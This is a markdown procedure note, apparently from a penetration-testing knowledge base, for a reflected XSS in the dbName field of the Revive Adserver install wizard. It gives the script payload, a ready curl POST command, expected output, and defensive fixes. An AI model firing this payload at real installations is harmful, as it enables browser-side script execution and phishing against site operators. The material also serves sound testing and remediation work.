---
tags:
  - xss-injection
  - payload
  - dbName
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xss-payload]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: beginner
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 3df836c4-4658-47fc-8677-5d11a2a40d2a
created_at: '2025-12-14T03:16:02.962Z'
updated_at: '2025-12-14T03:16:02.962Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-dbName

## Summary

This procedure injects a JavaScript payload into the dbName parameter of the Revive Adserver installation form, triggering a reflected XSS by exploiting unsanitized error output.

## Description

In Step 2 of the wizard, the dbName field accepts input that, when invalid, is echoed back in an error span without HTML escaping. A payload like `something<script>alert('xss');</script>` causes the script to execute on error display. This affects client-side execution in the browser, with similar behavior for dbUser. The attack relies on the PHP backend's lack of output encoding in templates like install/messages.html.

## Requirements

1. Access to the database configuration form.
2. Browser without strict XSS blocking (e.g., Firefox 47.0).
3. Target URL for POST submission.

## Defense

Defensive measures and detection strategies:

- Apply output escaping in error messages using htmlspecialchars() in PHP.
- Use Content Security Policy (CSP) to block inline scripts.
- Validate and sanitize database name inputs server-side.

## Objectives

1. Submit form with malicious dbName.
2. Trigger error reflection.
3. Enable JavaScript execution for potential attacks like phishing.

## Instructions

### Step 1: Prepare and Submit Payload

**Context**: Fill the form with the XSS payload in dbName to force an error.

**Command** ([[commands/curl-post-xss-payload]]):
```bash
curl -X POST 'http://target/www/admin/install.php' -d 'action=database&dbType=mysql&dbHost=localhost&dbUser=root&dbPassword=roots&dbName=something<script>alert("xss");</script>'
```

> This sends the POST request. Expected output: HTML response with error span containing the unescaped payload, e.g., `<span id='errorMessages'>...something<script>alert('xss');</script>...</span>`.

### Step 2: Manual Browser Submission

**Context**: Alternative to curl for interactive testing.

Use [[tools/Firefox]] to enter the payload in the dbName field and submit.

> Expected output: Same error response, with script poised for execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xss-payload]]

## Tools Used

- [[tools/Firefox]]

## Tags

- xss-injection
- payload
